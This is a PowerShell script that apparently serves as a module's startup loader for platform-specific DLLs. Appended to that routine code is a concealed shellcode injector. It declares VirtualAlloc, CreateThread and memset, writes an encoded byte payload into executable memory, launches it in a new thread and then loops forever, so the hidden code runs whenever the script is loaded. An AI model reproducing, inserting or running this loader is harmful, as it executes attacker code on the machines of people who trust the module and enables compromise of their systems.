﻿$platformDirectory = Join-Path (Join-Path $PSScriptRoot "..") "PlatformAssemblies"
if ($PSEdition -eq 'Desktop' -or $IsWindows) {
    $platformDirectory = Join-Path $platformDirectory "win" 
}
elseif ($IsLinux -or $IsMacOs) {
	$platformDirectory = Join-Path $platformDirectory "unix"
}

try {
	 $loadedAssemblies = ([System.AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object {New-Object -TypeName System.Reflection.AssemblyName -ArgumentList $_.FullName} )
    if (Test-Path $platformDirectory -ErrorAction Ignore) {
	    Get-ChildItem -Path $platformDirectory -Filter *.dll -ErrorAction Stop | ForEach-Object {
            $assemblyName = ([System.Reflection.AssemblyName]::GetAssemblyName($_.FullName))
            $matches = ($loadedAssemblies | Where-Object {$_.Name -eq $assemblyName.Name})
            if (-not $matches)
            {
                Add-Type -Path $_.FullName -ErrorAction Ignore | Out-Null
            }
		}
    }
}
catch {}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xd7,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0xbf,0xf9,0xaa,0x1c,0x52,0x31,0x78,0x18,0x83,0xc0,0x04,0x03,0x78,0xed,0x48,0xe9,0xae,0xe5,0x0f,0x12,0x4f,0xf5,0x6f,0x9a,0xaa,0xc4,0xaf,0xf8,0xbf,0x76,0x00,0x8a,0x92,0x7a,0xeb,0xde,0x06,0x09,0x99,0xf6,0x29,0xba,0x14,0x21,0x07,0x3b,0x04,0x11,0x06,0xbf,0x57,0x46,0xe8,0xfe,0x97,0x9b,0xe9,0xc7,0xca,0x56,0xbb,0x90,0x81,0xc5,0x2c,0x95,0xdc,0xd5,0xc7,0xe5,0xf1,0x5d,0x3b,0xbd,0xf0,0x4c,0xea,0xb6,0xaa,0x4e,0x0c,0x1b,0xc7,0xc6,0x16,0x78,0xe2,0x91,0xad,0x4a,0x98,0x23,0x64,0x83,0x61,0x8f,0x49,0x2c,0x90,0xd1,0x8e,0x8a,0x4b,0xa4,0xe6,0xe9,0xf6,0xbf,0x3c,0x90,0x2c,0x35,0xa7,0x32,0xa6,0xed,0x03,0xc3,0x6b,0x6b,0xc7,0xcf,0xc0,0xff,0x8f,0xd3,0xd7,0x2c,0xa4,0xef,0x5c,0xd3,0x6b,0x66,0x26,0xf0,0xaf,0x23,0xfc,0x99,0xf6,0x89,0x53,0xa5,0xe9,0x72,0x0b,0x03,0x61,0x9e,0x58,0x3e,0x28,0xf6,0xad,0x73,0xd3,0x06,0xba,0x04,0xa0,0x34,0x65,0xbf,0x2e,0x74,0xee,0x19,0xa8,0x7b,0xc5,0xde,0x26,0x82,0xe6,0x1e,0x6e,0x40,0xb2,0x4e,0x18,0x61,0xbb,0x04,0xd8,0x8e,0x6e,0xb0,0xdd,0x18,0x51,0xed,0xde,0xc6,0x39,0xec,0xde,0xe7,0xe5,0x79,0x38,0x57,0x46,0x2a,0x95,0x17,0x36,0x8a,0x45,0xff,0x5c,0x05,0xb9,0x1f,0x5f,0xcf,0xd2,0xb5,0xb0,0xa6,0x8b,0x21,0x28,0xe3,0x40,0xd0,0xb5,0x39,0x2d,0xd2,0x3e,0xce,0xd1,0x9c,0xb6,0xbb,0xc1,0x48,0x37,0xf6,0xb8,0xde,0x48,0x2c,0xd6,0xde,0xdc,0xcb,0x71,0x89,0x48,0xd6,0xa4,0xfd,0xd6,0x29,0x83,0x76,0xde,0xbf,0x6c,0xe0,0x1f,0x50,0x6d,0xf0,0x49,0x3a,0x6d,0x98,0x2d,0x1e,0x3e,0xbd,0x31,0x8b,0x52,0x6e,0xa4,0x34,0x03,0xc3,0x6f,0x5d,0xa9,0x3a,0x47,0xc2,0x52,0x69,0x59,0x3e,0x85,0x57,0x2f,0x2e,0x15;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

